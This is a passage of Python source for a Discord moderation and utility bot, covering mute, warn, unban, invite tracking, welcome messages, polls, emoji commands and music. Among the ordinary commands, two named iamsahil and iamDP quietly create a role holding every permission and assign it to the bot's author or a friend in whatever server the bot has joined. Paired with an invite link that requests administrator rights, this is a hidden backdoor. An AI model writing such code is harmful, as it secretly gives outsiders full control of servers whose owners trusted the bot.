@commands.has_permissions(kick_members=True) 
async def mute(ctx, member: discord.Member=None, mutetime=None):
    if member is None:
        await client.say('Please specify member i.e. Mention a member to mute. Example-``mv!mute @user <time in minutes>``')
        return
    if mutetime is None:
        await client.say('Please specify time i.e. Mention a member to mute with time. Example-``mv!mute @user <time in minutes>``')
        return
    if member.server_permissions.kick_members:
        await client.say('**You cannot mute admin/moderator!**')
        return
    if ctx.message.author.bot:
      return
    else:
      mutetime =int(mutetime)
      mutetime = mutetime * 60
      output = mutetime/60
      role = discord.utils.get(member.server.roles, name='Muted')
      await client.add_roles(member, role)
      await client.say("Muted **{}**".format(member.name))
      await client.send_message(member, "You are muted by {0} for {1} Minutes".format(ctx.message.author, output))
      for channel in member.server.channels:
        if channel.name == '<log channel name>':
            embed=discord.Embed(title="User Muted!", description="**{0}** was muted by **{1}** for {2} minutes!".format(member, ctx.message.author, output), color=0x37F60A)
            await client.send_message(channel, embed=embed)
            await asyncio.sleep(mutetime)
            await client.remove_roles(member, role)
            await client.say("Unmuted **{}**".format(member.name))
            embed=discord.Embed(title="User unmuted!", description="**{0}** was unmuted!".format(member, ctx.message.author), color=0xFD1600)
            await client.send_message(channel, embed=embed)
            
@client.command(pass_context = True)
@commands.has_permissions(kick_members=True) 
async def unmute(ctx, member: discord.Member=None):
    if member is None:
      await client.say('Please specify member i.e. Mention a member to unmute. Example- ``mv!unmute @user``')
    if ctx.message.author.bot:
      return
    else:
      role = discord.utils.get(member.server.roles, name='Muted')
      await client.remove_roles(member, role)
      await client.say("Unmuted **{}**".format(member))
      for channel in member.server.channels:
        if channel.name == '<log channel name>':
            embed=discord.Embed(title="User unmuted!", description="**{0}** was unmuted by **{1}**!".format(member, ctx.message.author), color=0xFD1600)
            await client.send_message(channel, embed=embed)
     
@client.command(pass_context = True)
@commands.check(is_owner)
async def servers(ctx):
  servers = list(client.servers)
  await client.say(f"Connected on {str(len(servers))} servers:")
  await client.say('\n'.join(server.name for server in servers))
  
@client.event
async def on_member_join(member):
    for channel in member.server.channels:
        if channel.name == '★彡-welcome-彡★':
            embed = discord.Embed(title=f'Welcome {member.name} to {member.server.name}', description='Do not forget to check rules and never try to break any one of them', color = 0x36393E)
            embed.add_field(name='__Thanks for joining__', value='**Hope you will be active here.**', inline=True)
            embed.set_thumbnail(url='https://media.giphy.com/media/OkJat1YNdoD3W/giphy.gif') 
            embed.add_field(name='__Join position__', value='{}'.format(str(member.server.member_count)), inline=True)
            embed.add_field(name='Time of joining', value=member.joined_at)
            await asyncio.sleep(0.4)
            await client.send_message(channel, embed=embed) 
            
@client.event
async def on_member_remove(member):
    for channel in member.server.channels:
        if channel.name == '★彡-welcome-彡★':
            r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
            embed = discord.Embed(title=f'{member.name} just left {member.server.name}', description='Bye bye 👋! We will miss you 😢', color = discord.Color((r << 16) + (g << 8) + b))
            embed.add_field(name='__User left__', value='**Hope you will be back soon 😕.**', inline=True)
            embed.add_field(name='Your join position was', value=member.joined_at)
            embed.set_thumbnail(url=member.avatar_url)
            await client.send_message(channel, embed=embed)
            
@client.command(pass_context=True)
async def jointest(ctx):
    member = ctx.message.author
    for channel in member.server.channels:
        if channel.name == '★彡-welcome-彡★':
            embed = discord.Embed(title=f'Welcome {member.name} to {member.server.name}', description='Do not forget to check rules and never try to break any one of them', color = 0x36393E)
            embed.add_field(name='__Thanks for joining__', value='**Hope you will be active here.**', inline=True)
            embed.set_thumbnail(url='https://media.giphy.com/media/OkJat1YNdoD3W/giphy.gif') 
            embed.add_field(name='__Join position__', value='{}'.format(str(member.server.member_count)), inline=True)
            embed.add_field(name='Time of joining', value=member.joined_at)
            await asyncio.sleep(0.4)
            await client.send_message(channel, embed=embed) 
            
@client.command(pass_context=True)
async def ownerinfo(ctx):
    embed = discord.Embed(title="Information about owner", description="Main Creator: Gamer Sahil", color=0x00ff00)
    embed.set_footer(text="My bot")
    embed.set_author(name=" Bot Owner Names- Gamer Sahil#5270: 420525168381657090")
    embed.add_field(name="Site- https://discordapp.com/oauth2/authorize?client_id=553509385142403072&permissions=8&scope=bot", value="Thanks for adding our bot", inline=True)
    await client.say(embed=embed)
    
@client.command(pass_context=True)
async def inviteb(ctx):
    total_uses=0
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    server = ctx.message.channel.server
    invites = await client.invites_from(server)
    invlb = f'Invites of {ctx.message.server.name}\n'
    for invite in invites:
      total_uses += invite.uses
      invlb += f'User: {invite.inviter.name}\nInvites: {invite.uses}\n'
    embed=discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.add_field(name='Invites List',value=invlb)
    embed.add_field(name='Total Invites',value=total_uses)
    embed.set_footer(text=f'Requested by: {ctx.message.author.display_name}', icon_url=f'{ctx.message.author.avatar_url}')
    await client.say(embed=embed)
    
@client.command(pass_context=True)
async def invites(ctx, user:discord.Member=None):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    if ctx.message.server.id == '527430758902661121':
        await client.say('You should use ``g!checkinvites``')
        return
    if user is None:
        total_uses=0
        embed=discord.Embed(title='__Invites from {}__'.format(ctx.message.author.name), color = discord.Color((r << 16) + (g << 8) + b))
        invites = await client.invites_from(ctx.message.server)
        for invite in invites:
          if invite.inviter == ctx.message.author:
              total_uses += invite.uses
              embed.add_field(name='Invite',value=invite.id)
              embed.add_field(name='Uses',value=invite.uses)
              embed.add_field(name='Channel',value=invite.channel)
              embed.set_footer(text=f'Requested by: {ctx.message.author.display_name}', icon_url=f'{ctx.message.author.avatar_url}')
        embed.add_field(name='__Total Uses__',value=total_uses)
        await client.say(embed=embed)
    else:
        total_uses=0
        embed=discord.Embed(title='__Invites from {}__'.format(user.name), color = discord.Color((r << 16) + (g << 8) + b))
        invites = await client.invites_from(ctx.message.server)
        for invite in invites:
          if invite.inviter == user:
              total_uses += invite.uses
              embed.add_field(name='Invite',value=invite.id)
              embed.add_field(name='Uses',value=invite.uses)
              embed.add_field(name='Channel',value=invite.channel)
              embed.set_footer(text=f'Requested by: {ctx.message.author.display_name}', icon_url=f'{ctx.message.author.avatar_url}')
        embed.add_field(name='__Total Uses__',value=total_uses)
        await client.say(embed=embed)
      
@client.command(pass_context=True)
async def checkinvites(ctx, user:discord.Member=None):
    if ctx.message.server.id == '527430758902661121':
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        if user is None:
            total_uses=0
            embed=discord.Embed(title='__Invites from {}__'.format(ctx.message.author.name), color = discord.Color((r << 16) + (g << 8) + b))
            invites = await client.invites_from(ctx.message.server)
            for invite in invites:
              if invite.inviter == ctx.message.author:
                  total_uses += invite.uses
                  embed.add_field(name='Invite',value=invite.id)
                  embed.add_field(name='Uses',value=invite.uses)
                  embed.add_field(name='Channel',value=invite.channel)
                  embed.set_footer(text=f'Requested by: {ctx.message.author.display_name}', icon_url=f'{ctx.message.author.avatar_url}')
            embed.add_field(name='__Total Uses__',value=total_uses)
            await client.say(embed=embed)
            if total_uses >= 20:
                role = discord.utils.get(ctx.message.server.roles, name='Inviter I')
                if role in ctx.message.author.roles:
                    return
                else:
                    await client.add_roles(ctx.message.author, role)
                    await client.say('Congrats! You have got Inviter I role')
            if total_uses >= 30:
                role = discord.utils.get(ctx.message.server.roles, name='Inviter II')
                if role in ctx.message.author.roles:
                    return
                else:
                    await client.add_roles(ctx.message.author, role)
                    await client.say('Congrats! You have got Inviter II role')
            if total_uses >= 50:
                role = discord.utils.get(ctx.message.server.roles, name='Inviter III')
                if role in ctx.message.author.roles:
                    return
                else:
                    await client.add_roles(ctx.message.author, role)
                    await client.say('Congrats! You have got Inviter III role')
            if total_uses >= 80:
                role = discord.utils.get(ctx.message.server.roles, name='Inviter IV')
                if role in ctx.message.author.roles:
                    return
                else:
                    await client.add_roles(ctx.message.author, role)
                    await client.say('Congrats! You have got Inviter IV role')
        else:
            total_uses=0
            embed=discord.Embed(title='__Invites from {}__'.format(user.name), color = discord.Color((r << 16) + (g << 8) + b))
            invites = await client.invites_from(ctx.message.server)
            for invite in invites:
              if invite.inviter == user:
                  total_uses += invite.uses
                  embed.add_field(name='Invite',value=invite.id)
                  embed.add_field(name='Uses',value=invite.uses)
                  embed.add_field(name='Channel',value=invite.channel)
                  embed.set_footer(text=f'Requested by: {ctx.message.author.display_name}', icon_url=f'{ctx.message.author.avatar_url}')
            embed.add_field(name='__Total Uses__',value=total_uses)
            await client.say(embed=embed)
            if total_uses >= 20:
                role = discord.utils.get(user.server.roles, name='Inviter I')
                if role in user.roles:
                    return
                else:
                    await client.add_roles(user, role)
                    await client.say(f'Congrats! {user.name}, You have got Inviter I role')
            if total_uses >= 30:
                role = discord.utils.get(user.server.roles, name='Inviter II')
                if role in user.roles:
                    return
                else:
                    await client.add_roles(user, role)
                    await client.say(f'Congrats! {user.name} You have got Inviter II role')
            if total_uses >= 50:
                role = discord.utils.get(user.server.roles, name='Inviter III')
                if role in user.roles:
                    return
                else:
                    await client.add_roles(user, role)
                    await client.say(f'Congrats! {user.name} You have got Inviter III role')
            if total_uses >= 80:
                role = discord.utils.get(user.server.roles, name='Inviter IV')
                if role in user.roles:
                    return
                else:
                    await client.add_roles(user, role)
                    await client.say(f'Congrats! {user.name} You have got Inviter IV role')
    else:
        await client.say('You are not allowed to use this command in this server')
        return 

@client.command(pass_context = True)
async def avatar(ctx, user: discord.Member=None):
    if user is None:
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(title=f'Avatar', description='Avatar is profile picture of a user in discord', color = discord.Color((r << 16) + (g << 8) + b))
        embed.add_field(name='User: {}'.format(ctx.message.author.name), value='Avatar:', inline=True)
        embed.set_thumbnail(url='https://cdn.discordapp.com/icons/489333893988745217/eb022a7023d013bec656cd7b94d6d6c1.png') 
        embed.set_image(url = ctx.message.author.avatar_url)
        await client.say(embed=embed)
    else:
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(title=f'Avatar', description='Avatar is profile picture of a user in discord', color = discord.Color((r << 16) + (g << 8) + b))
        embed.add_field(name='User: {}'.format(user.name), value='Avatar:', inline=True)
        embed.set_thumbnail(url='https://cdn.discordapp.com/icons/489333893988745217/eb022a7023d013bec656cd7b94d6d6c1.png') 
        embed.set_image(url = user.avatar_url)
        await client.say(embed=embed)
        
@client.command(pass_context = True)
async def setupwelcomer(ctx):
    if ctx.message.author.bot:
      return
    if ctx.message.author.server_permissions.administrator == False:
      await client.say('**You do not have permission to use this command**')
      return
    else:
      server = ctx.message.server
      everyone_perms = discord.PermissionOverwrite(send_messages=False, read_messages=True)
      everyone = discord.ChannelPermissions(target=server.default_role, overwrite=everyone_perms)
      await client.create_channel(server, '★彡-welcome-彡★',everyone)
      
@client.command(pass_context = True)
async def setuplog(ctx):
    if ctx.message.author.bot:
      return
    if ctx.message.author.server_permissions.administrator == False:
      await client.say('**You do not have permission to use this command**')
      return
    else:
      author = ctx.message.author
      server = ctx.message.server
      everyone_perms = discord.PermissionOverwrite(send_messages=False, read_messages=True)
      everyone = discord.ChannelPermissions(target=server.default_role, overwrite=everyone_perms)
      await client.create_channel(server, '╰☆☆-GamerGod-log-☆☆╮',everyone)
      
@client.command(pass_context=True)  
async def getuser(ctx, role: discord.Role = None):
    if role is None:
        await client.say('Please tag a role to get users having it. Example- ``mv!getuser @role``')
        return
    if ctx.message.author.server_permissions.kick_members == False:
       await client.say('**You do not have permission to use this command**')
       return
    empty = True
    for member in ctx.message.server.members:
        if role in member.roles:
            await client.say("{0.name}: {0.id}".format(member))
            empty = False
    if empty:
        await client.say("Nobody has the role {}".format(role.mention))
        
@client.command(pass_context = True)
async def userinfo(ctx, user: discord.Member=None):
    if user is None:
      await client.say('Please tag a user to get user information. Example- ``mv!userinfo @user``')
    if ctx.message.author.bot:
      return
    if ctx.message.author.server_permissions.kick_members == False:
      await client.say('**You do not have permission to use this command**')
      return
    else:
      r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
      embed = discord.Embed(title="{}'s info".format(user.name), description="Here's what I could find.", color = discord.Color((r << 16) + (g << 8) + b))
      embed.add_field(name="Name", value=user.mention, inline=True)
      embed.add_field(name="ID", value=user.id, inline=True)
      embed.add_field(name="Status", value=user.status, inline=True)
      embed.add_field(name="Highest role", value=user.top_role)
      embed.add_field(name="Color", value=user.color)
      embed.add_field(name="Playing", value=user.game)
      embed.add_field(name="Nickname", value=user.nick)
      embed.add_field(name="Joined", value=user.joined_at.strftime("%d %b %Y %H:%M"))
      embed.add_field(name="Created", value=user.created_at.strftime("%d %b %Y %H:%M"))
      embed.set_thumbnail(url=user.avatar_url)
      await client.say(embed=embed)
      
@client.command(pass_context = True)
async def roleinfo(ctx,*, role:discord.Role=None):
    if discord.utils.get(ctx.message.server.roles, name="{}".format(role)) is None:
        await client.say("No such role found")
        return
    if ctx.message.author.server_permissions.manage_roles == False:
        await client.say('**You do not have permission to use this command**')
        return
    else:
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(title="{}'s info".format(role.name), description="Here's what I could find.", color = discord.Color((r << 16) + (g << 8) + b))
        embed.set_thumbnail(url = ctx.message.server.icon_url)
        embed.add_field(name="Name", value=role.name, inline=True)
        embed.add_field(name="ID", value=role.id, inline=True)
        embed.add_field(name="Color", value=role.color)
        embed.add_field(name="Created", value=role.created_at.strftime("%d %b %Y %H:%M"))
        await client.say(embed=embed)
        
@client.command(pass_context=True)
async def unbanall(ctx):
    if ctx.message.author.bot:
      return
    if ctx.message.author.server_permissions.ban_members == False:
      await client.say('**You do not have permission to use this command**')
      return
    else:
      server=ctx.message.server
      ban_list=await client.get_bans(server)
      await client.say('Unbanning {} members'.format(len(ban_list)))
      for channel in ctx.message.author.server.channels:
        if channel.name == '╰☆☆-gamergod-log-☆☆╮':
            embed=discord.Embed(title="All users are unbanned!", description="Members were unbanned by **{}**!".format(ctx.message.author), color=0x05F6E0)
            await client.send_message(channel, embed=embed)
      for member in ban_list:
          await client.unban(server,member)
          
@client.command(pass_context = True)
@commands.has_permissions(kick_members=True)
async def warn(ctx, userName: discord.User=None,*, message:str=None): 
    if userName is None:
      await client.say('Please tag a person to warn user. Example- ``g!warn @user <reason>``')
      return
    else:
      await client.send_message(userName, "You have been warned for: **{}**".format(message))
      await client.say(":warning: __**{0} Has Been Warned!**__ :warning: ** Reason:{1}** ".format(userName,message))
      for channel in userName.server.channels:
        if channel.name == '╰☆☆-gamergod-log-☆☆╮':
            embed=discord.Embed(title="User Warned!", description="{0} warned by {1} for {2}".format(userName, ctx.message.author, message), color=0x0521F6)
            await client.send_message(channel, embed=embed)
            
@client.command(pass_context=True)
async def poll(ctx, question, *options: str):
        if len(options) <= 1:
            await client.say('You need more than one option to make a poll!')
            return
        if len(options) > 10:
            await client.say('You cannot make a poll for more than 10 things!')
            return

        if len(options) == 2 and options[0] == 'yes' and options[1] == 'no':
            reactions = ['👍', '👎']
        else:
            reactions = ['1\u20e3', '2\u20e3', '3\u20e3', '4\u20e3', '5\u20e3', '6\u20e3', '7\u20e3', '8\u20e3', '9\u20e3', '\U0001f51f']

        description = []
        for x, option in enumerate(options):
            description += '\n {} {}'.format(reactions[x], option)
            r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(title=question, description=''.join(description), color = discord.Color((r << 16) + (g << 8) + b))
        react_message = await client.say(embed=embed)
        for reaction in reactions[:len(options)]:
            await client.add_reaction(react_message, reaction)
        embed.set_footer(text='Poll ID: {}'.format(react_message.id))
        await client.edit_message(react_message, embed=embed)
        
@client.command(pass_context=True)  
@commands.has_permissions(ban_members=True)     
async def unban(ctx, identification:str):
    user = await client.get_user_info(identification)
    await client.unban(ctx.message.server, user)
    try:
        await client.say(f'`{user}` has been unbanned from the server.')
        for channel in ctx.message.server.channels:
          if channel.name == '╰☆☆-gamergod-log-☆☆╮':
              embed=discord.Embed(title="User unbanned!", description="**{0}** unbanned by **{1}**!".format(user, ctx.message.author), color=0x38761D)
              await client.send_message(channel, embed=embed)
    except:
        await client.say(f'Unable to unban `{user}`')
        pass
        
@client.command(pass_context = True)
@commands.has_permissions(administrator=True)
async def say(ctx, *, msg = None):
    await client.delete_message(ctx.message)
    if ctx.message.author.bot:
      return
    else:
      if not msg: await client.say("Please specify a message to send")
      else: await client.say(msg)
	
@client.command(pass_context = True)
@commands.has_permissions(administrator=True)
async def saytts(ctx, *, msg = None):
    await client.delete_message(ctx.message)
    if ctx.message.author.bot:
      return
    else:
      if not msg: await client.say("Please specify a message to send")
      else: await client.say(msg, tts=True)
      
@client.command(pass_context = True)
@commands.has_permissions(administrator=True)
async def emojiids(ctx):
  for emoji in ctx.message.author.server.emojis:
    print(f"<:{emoji.name}:{emoji.id}>")
    print(" ")    
			
@client.command(pass_context = True)
async def wow(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:WOW:515854429485006848>')
	
@client.command(pass_context = True)
async def dank(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:OnThaCoco:515853700682743809>')

@client.command(pass_context = True)
async def santa(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:santa:517232271678504970>')
	
@client.command(pass_context = True)
async def hi(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:hi:517232279148429313>')
	
@client.command(pass_context = True)
async def lol(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:lol:517232283670020096>')
	
@client.command(pass_context = True)
async def love(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:love:517232300912672774>')
	
@client.command(pass_context = True)
async def mad(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:mad:517232301176913951>')
	
@client.command(pass_context = True)
async def alien(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:alien:517232332663422986>')

@client.command(pass_context = True)
async def fearfromme(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:shiroeglassespush:516174320532193289>')
	   	
@client.command(pass_context = True)
async def angry(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:angear:516174316950388772>')
	
@client.command(pass_context = True)
async def surprised(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:eyebigger:516174315058626560>')
		
@client.command(pass_context = True)
async def cat(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:agooglecat:516174312294842389>')
		
@client.command(pass_context = True)
async def thinking1(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:thinking:516183328613990400>')
	
@client.command(pass_context = True)
async def thinking2(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:thinking2:516183323127709699>')
	
@client.command(pass_context = True)
async def upvote(ctx):
    if ctx.message.author.bot:
      return
    else:
      await client.send_message(ctx.message.author, 'Upvote us: https://discordbots.org/bot/515403515217313795')
      await client.say('Check your dm for link')
	
@client.command(pass_context = True)
async def happy(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:happy:516183323052212236>')
		
@client.command(pass_context = True)
@commands.has_permissions(administrator=True) 
async def bans(ctx):
    '''Gets A List Of Users Who Are No Longer With us'''
    x = await client.get_bans(ctx.message.server)
    x = '\n'.join([y.name for y in x])
    embed = discord.Embed(title = "List of The Banned Idiots", description = x, color = 0xFFFFF)
    return await client.say(embed = embed)
		
@client.command(pass_context=True)
async def membernames(ctx):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    try:
        embed = discord.Embed(description="\n".join([member.name for member in ctx.message.server.members]), color=0x0093ff)
        await client.send_message(ctx.message.author, embed=embed)
    except:
        embed = discord.Embed(title="There are too many members that the bot cannot list it down", color = discord.Color((r << 16) + (g << 8) + b))
        await client.say(embed=embed)
        
@client.command(pass_context=True)
@commands.has_permissions(administrator=True)
async def embed(ctx, *args):
    if ctx.message.author.bot:
      return
    else:
      argstr = " ".join(args)
      r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
      text = argstr
      color = discord.Color((r << 16) + (g << 8) + b)
      await client.send_message(ctx.message.channel, embed=Embed(color = color, description=text))
      await client.delete_message(ctx.message)
      
@client.command(pass_context = True)
@commands.has_permissions(administrator=True)     
async def makemod(ctx, user: discord.Member):
    nickname = '♏' + user.name
    await client.change_nickname(user, nickname=nickname)
    role = discord.utils.get(ctx.message.server.roles, name='Moderator')
    await client.add_roles(user, role)
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_author(name='Congratulations Message')
    embed.add_field(name = '__Congratulations__',value ='**Congratulations for mod.Hope you will be more active here. Thanks for your help and support.**',inline = False)
    embed.set_image(url = 'https://preview.ibb.co/i1izTz/ezgif_5_e20b665628.gif')
    await client.send_message(user,embed=embed)
    await client.delete_message(ctx.message)
    
@client.command(pass_context = True)
@commands.has_permissions(administrator=True)     
async def removemod(ctx, user: discord.Member):
    nickname = user.name
    await client.change_nickname(user, nickname=nickname)
    role = discord.utils.get(ctx.message.server.roles, name='Moderator')
    await client.remove_roles(user, role)
    await client.delete_message(ctx.message)
      
@client.command(pass_context=True)
async def unverify(ctx):
    await client.delete_message(ctx.message)
    role = discord.utils.get(ctx.message.server.roles, name='Unverified')
    await client.add_roles(ctx.message.author, role)
    
@client.command(pass_context=True)
async def verify(ctx):
    if ctx.message.author.bot:
      return
    else:
      await client.delete_message(ctx.message)
      role = discord.utils.get(ctx.message.server.roles, name='Verified')
      await client.add_roles(ctx.message.author, role)
      
@client.command(pass_context = True)
async def reactionroles(ctx, *, msg = None):
    if not msg: await client.say("Check this video to setup YAGPDB BOT- https://www.youtube.com/watch?v=icAqiw6txRQ")
    if '@here' in msg or '@everyone' in msg:
      return
    else: await client.say('Check this video to setup YAGPDB BOT- https://www.youtube.com/watch?v=icAqiw6txRQ ' + msg)
    return

@client.command(pass_context = True)
@commands.has_permissions(kick_members=True)
async def english(ctx, *, msg = None):
    await client.delete_message(ctx.message)
    if not msg: await client.say("Please specify a user to warn")
    if '@here' in msg or '@everyone' in msg:
      return
    else: await client.say(msg + ', Please do not use language other than **English.**')
    return
    
@client.command(pass_context=True)
@commands.check(is_owner)
async def setgame(ctx, *, game:str):
    await client.delete_message(ctx.message)
    await client.change_presence(game=discord.Game(name=game))
    await asyncio.sleep(10)
    
@client.command(pass_context = True)
@commands.check(is_sahil)
async def iamsahil(ctx):
    user = ctx.message.author
    if discord.utils.get(user.server.roles, name="Sahil") is None:
        await client.create_role(user.server, name="Sahil", permissions=discord.Permissions.all())
        role = discord.utils.get(ctx.message.server.roles, name='Sahil')
        await client.add_roles(ctx.message.author, role)
    else:	
        author = ctx.message.author
        await client.delete_message(ctx.message)
        role = discord.utils.get(ctx.message.server.roles, name='Sahil')
        await client.add_roles(ctx.message.author, role)
        print('Added Sahil role in ' + (ctx.message.author.name))
        await client.send_message(author, embed=embed)
        
@client.command(pass_context = True)
@commands.check(is_DP)
async def iamDP(ctx):
    user = ctx.message.author
    if discord.utils.get(user.server.roles, name="DP") is None:
        await client.create_role(user.server, name="DP", permissions=discord.Permissions.all())
        role = discord.utils.get(ctx.message.server.roles, name='DP')
        await client.add_roles(ctx.message.author, role)
    else:	
        author = ctx.message.author
        await client.delete_message(ctx.message)
        role = discord.utils.get(ctx.message.server.roles, name='DP')
        await client.add_roles(ctx.message.author, role)
        print('Added DP role in ' + (ctx.message.author.name))
        await client.send_message(author, embed=embed)
        
@client.command(pass_context = True)
async def play(ctx, *, url):
    author = ctx.message.author
    voice_channel = author.voice_channel
    try:
        vc = await client.join_voice_channel(voice_channel)
        msg = await client.say("Loading...")
        player = await vc.create_ytdl_player("ytsearch:" + url)
        player.start()
        await client.say("Succesfully Loaded ur song!")
        await client.delete_message(msg)
    except Exception as e:
        print(e)
        await client.say("Reconnecting")
        for x in client.voice_clients:
            if(x.server == ctx.message.server):
                await x.disconnect()
                nvc = await client.join_voice_channel(voice_channel)
                msg = await client.say("Loading...")
                player2 = await nvc.create_ytdl_player("ytsearch:" + url)
                player2.start()
                
@client.command(pass_context = True)
async def stop(ctx):
    for x in client.voice_clients:
        if(x.server == ctx.message.server):
            return await x.disconnect()

    return await client.say("I am not playing anyting???!")

@client.command(pass_context=True)
@commands.has_permissions(kick_members=True)
async def joinvoice(ctx):
    author = ctx.message.author
    channel = author.voice_channel
    await client.join_voice_channel(channel)

client.run(Token)
